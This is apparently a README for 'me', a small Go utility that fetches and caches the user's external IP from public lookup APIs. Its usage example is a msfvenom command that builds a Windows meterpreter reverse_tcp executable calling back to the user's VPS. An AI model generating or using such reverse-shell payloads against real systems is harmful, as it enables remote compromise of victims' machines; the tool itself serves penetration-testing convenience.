# me

## Install

```
go install github.com/cokeBeer/me@latest
```

## Usage
For example, we can generate a meterpreter on VPS and fill the `LHOST` parameter simply by `me`
```
msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST=`me` LPORT=4444 >mp.exe
```
You will never need to query your external ip and paste it again.

## How it work
For the first time, `me` will request some apis to get your external ip and save the ip to `$USER/.myexternalip`.
```
http://myexternalip.com/raw
http://api.ipify.org/
https://myexternalip.com/raw
https://api.ipify.org/
```
Next time, `me` will get the ip from file.
You can use `-f` option to make `me` query again, and use `-d` option to see debug information when occur errors.

## Warning
Don't use it when you are using a proxy.